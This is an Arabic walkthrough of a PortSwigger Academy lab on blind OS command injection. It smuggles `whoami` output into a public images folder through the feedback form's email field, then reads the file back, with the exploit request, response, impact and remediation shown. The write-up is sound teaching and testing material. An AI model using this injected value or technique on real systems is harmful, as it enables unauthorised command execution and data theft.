# Lab 03 — Blind OS Command Injection with Output Redirection (حقن أعمى بإعادة توجيه المخرجات لملف)

[![التصنيف](https://img.shields.io/badge/الفئة-OS%20Command%20Injection-red)]()
[![النوع](https://img.shields.io/badge/النوع-OS%20Command%20Injection%20(Blind%20Output%20Redirection)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/os-command-injection)

> هذا الشرح جزء من سلسلة [معامل حقن أوامر النظام (OS Command Injection)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 03 — Blind OS Command Injection with Output Redirection (حقن أعمى بإعادة توجيه المخرجات لملف) |
| **تصنيف الثغرة** | OS Command Injection (Blind Output Redirection) |
| **معيار الضعف (CWE)** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | تنفيذ أمر whoami وإعادة توجيه ناتجه إلى ملف نصي في مجلد الصور ثم قراءته لحل اللاب. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

نفس سيناريو نموذج الفيدباك السابق: حقل الإيميل مصاب بحقن أوامر، لكن التطبيق أعمى لا يظهر المخرجات في شاشة الشكر.

**فكرة الحل الذكية (Output Redirection):**
نعلم من تصفح المتجر أن صور المنتجات تخدم من مسار عام على السيرفر هو `/var/www/images/`، ويستطيع أي شخص قراءة محتويات هذا المجلد عبر رابط `GET /image?filename=...`.
نستغل ميزة الشل في إعادة توجيه المخرجات (`>`):
نحقن الأمر: `||whoami>/var/www/images/output.txt||`.
يقوم الشل بتنفيذ `whoami` وحفظ اسمه داخل ملف جديد اسمه `output.txt` داخل مجلد الصور العام! ثم نقوم بطلب `GET /image?filename=output.txt` لنقرأ اسم المستخدم الذي كتبه السيرفر بيده!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يدمج ميزة إعادة توجيه مخرجات الشل إلى ملف على القرص (`>`) مع ميزة استعراض الصور العامة في الموقع لقراءة مخرجات الأمر الأعمى.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
السماح بتنفيذ أوامر الشل مع وجود مجلدات عامة يملك خادم الويب صلاحية الكتابة والقراءة بداخلها معاً.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. التقط طلب إرسال الفيدباك `POST /feedback/submit` وأرسله إلى **Repeater**.
2. في حقل `email`، احقن الأمر التالي لتوجيه ناتج `whoami` إلى مجلد الصور:
`email=x||whoami>/var/www/images/output.txt||`.
3. اضغط Send: سينفذ السيرفر الأمر في صمت ويرد بـ `200 OK`.
4. الآن، اذهب إلى أي طلب لصورة منتج، وعدله ليطلب الملف المنشأ حديثاً:
`GET /image?filename=output.txt HTTP/1.1`.
5. اضغط Send: ستجد أن السيرفر أعاد محتوى الملف وفيه اسم مستخدم النظام (مثال: `peter-abcdef`)، وبذلك يحل اللاب!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /feedback/submit HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=a&email=a||whoami>/var/www/images/output.txt||
&subject=b&message=c
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

{"message": "Thank you for submitting feedback"}
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تحويل الحقن الأعمى إلى قراءة ملفات كاملة وسرقة أي بيانات من السيرفر.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

منع استخدام أوامر الشل، والتأكد من أن مجلدات الأصول الثابتة (Static Assets) غير قابلة للكتابة من قِبل المستخدمين أو العمليات غير المأذونة.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
